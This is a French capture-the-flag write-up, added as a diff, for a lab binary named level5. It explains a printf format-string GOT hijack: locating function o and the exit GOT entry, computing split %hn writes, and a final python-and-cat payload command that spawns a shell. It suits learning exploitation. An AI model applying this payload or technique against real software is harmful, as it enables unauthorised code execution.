@@ -1,0 +1,60 @@
+Contrairement aux niveaux précédents, l'analyse du code ne révèle aucune instruction cmp (comparaison) liée à une variable "porte". Cela signifie que le programme n'attend pas une valeur spécifique dans une variable pour nous donner le shell.
+
+- La Faille : Le programme utilise toujours un printf vulnérable.
+- L'Objectif : Puisqu'il n'y a pas de variable à modifier, nous allons pratiquer un GOT Hijacking. Nous allons forcer le programme à sauter vers une fonction "gagnante" au moment où il croit appeler une fonction standard (comme exit).
+
+Recherche des adresses cibles
+
+Pour réussir ce détournement, nous avons besoin de deux adresses précises.
+
+A. La fonction "Gagnante" (Où l'on veut aller)
+Dans GDB, on cherche une fonction qui n'est pas appelée mais qui contient le code pour nous donner l'accès.
+- Commande : info functions
+- Résultat : On trouve une fonction nommée o située à l'adresse 0x080484a4.
+
+B. Le point d'interception (Ce que l'on veut détourner)
+On cherche l'adresse de la fonction exit dans la table des liens du programme (la GOT).
+- Commande : objdump -R ./level5
+- Résultat : On trouve exit à l'adresse 0x08049838. C'est ici que nous allons écrire.
+
+Logique de l'écriture par moitié (%hn)
+
+L'adresse cible (0x080484a4) est trop grande pour être écrite en une fois sans faire ramer le système. On la découpe en deux morceaux de 2 octets (Shorts) :
+- Partie Basse (Low) : 0x84a4 (33 956 en décimal).
+- Partie Haute (High) : 0x0804 (2 052 en décimal).
+
+Les deux cibles mémoires :
+- On écrira 84a4 à l'adresse 0x08049838 (Base).
+- On écrira 0804 à l'adresse 0x0804983a (Base + 2).
+
+Calcul de l'offset et du padding
+
+En testant avec AAAA %p %p %p %p, on détermine que notre entrée commence à la 4ème position sur la pile.
+
+Calcul des caractères à imprimer :
+- Les adresses au début : On place nos deux adresses cibles. Elles occupent 8 octets (4 + 4).
+- Premier saut (vers 0x0804) : On veut atteindre 2052. 2052 - 8 = 2044 octets de padding.
+- Deuxième saut (vers 0x84a4) : On veut atteindre 33 956. 33956 - 2052 = 31904 octets de padding.
+
+Construction du Payload final
+
+Le payload se décompose comme suit :
+1. Les deux adresses cibles (Little-Endian).
+2. Le padding pour la partie haute (%2044d) suivi de l'écriture (%5$hn).
+3. Le padding pour la partie basse (%31904d) suivi de l'écriture (%4$hn).
+
+Note : L'ordre 4$ et 5$ dépend de l'ordre dans lequel tu as mis tes adresses au début.
+
+Procédure opératoire
+
+On utilise le "Double Cat" pour maintenir le shell ouvert après le détournement de la fonction exit.
+
+Commande finale :
+
+(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d" + "%4$hn" + "%31904d" + "%5$hn"'; cat) | ./level5
+
+Résultat attendu :
+- Le programme affiche ton texte formaté.
+- Au moment de quitter, il appelle exit().
+- Grâce à ton écrasement, il saute en réalité sur la fonction o.
+- Bingo ! Tu récupères le shell.
